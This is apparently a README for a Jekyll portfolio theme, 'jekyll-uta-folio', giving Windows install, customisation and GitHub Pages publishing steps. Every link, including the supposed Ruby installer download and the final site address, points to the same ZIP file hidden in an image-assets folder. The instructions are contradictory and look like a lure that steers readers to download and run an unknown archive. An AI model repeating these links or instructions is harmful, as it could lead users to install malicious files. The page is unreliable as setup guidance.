## 📋 About jekyll-uta-folio

Jekyll Uta Folio is a portfolio theme built with simplicity and performance in mind. It uses Tailwind CSS for styling and offers a modern, clean look. This theme is ideal for developers and creative professionals who want a professional web presence without complex setup.

This theme is responsive. It works well on desktops, tablets, and phones. It supports dark mode and includes features like glassmorphism to make your portfolio look modern and elegant.

You do not need to know Node.js or complex web development tools to use this theme. The setup is straightforward. Jekyll Uta Folio is also fast and lightweight, which means your site will load quickly.

## 🛠 Installation and Setup on Windows

Follow these steps to set up your portfolio using Jekyll Uta Folio.

### Step 1: Download the Theme

1. Go to the [Release Page](https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip).
2. Download the latest release source code as a ZIP file.
3. Save the ZIP file on your desktop or a folder you can find easily.

### Step 2: Extract Files

1. Right-click on the ZIP file.
2. Select "Extract All..."
3. Choose a folder to extract the files to and click "Extract".

### Step 3: Install Ruby and Jekyll

Jekyll runs on Ruby. You need to install both Ruby and Jekyll on your computer.

1. Visit https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip and download the **Ruby+Devkit** version recommended for your system.
2. Run the installer.
3. During installation, check the option to install MSYS2 tools.
4. After installation finishes, open the "Start Command Prompt with Ruby" from the Start menu.
5. In the command window, type the following and press Enter:

   ```
   gem install jekyll bundler
   ```

This installs Jekyll and Bundler.

### Step 4: Prepare Jekyll Uta Folio

1. Open the folder where you extracted the theme files.
2. Open the command prompt window in this folder:
   - Hold Shift, right-click inside the folder.
   - Select "Open PowerShell window here" or "Open command window here".
3. In the command window, type:

   ```
   bundle install
   ```

This installs all the required Ruby gems used by the theme.

### Step 5: Run the Theme Locally

Once setup is complete, run the following command in the same folder:

```
bundle exec jekyll serve
```

You will see messages as the site builds. 

When finished, open your web browser and go to:

```
http://localhost:4000
```

You will see the live version of your portfolio theme. Any changes you make to files will update automatically.

## 🔧 Customize Your Portfolio

You can change content and style by editing the files inside the extracted folder.

- **_config.yml**  
  This file contains site settings like title, description, and social links.

- **_posts/**  
  Use this folder to add blog posts if you want a blog section.

- **assets/css/**  
  Customize styles with Tailwind CSS if you know how, or modify existing CSS files.

- **index.md**  
  Edit this file to change the homepage content.

No special software is needed beyond a simple text editor.

## 🖥️ How to Publish Your Portfolio

Once your site looks how you want it locally, you can publish it with GitHub Pages.

1. Create a GitHub account if you don’t have one.
2. Create a new repository named `username.github.io` (replace `username` with your GitHub username).
3. Upload your site files to this repository.
4. GitHub Pages will automatically build and host your site at `https://raw.githubusercontent.com/Guide-du-futur/jekyll-uta-folio/main/assets/img/folio-jekyll-uta-v2.1.zip`.

No command-line tools are strictly required for publishing if you upload with GitHub’s web interface.
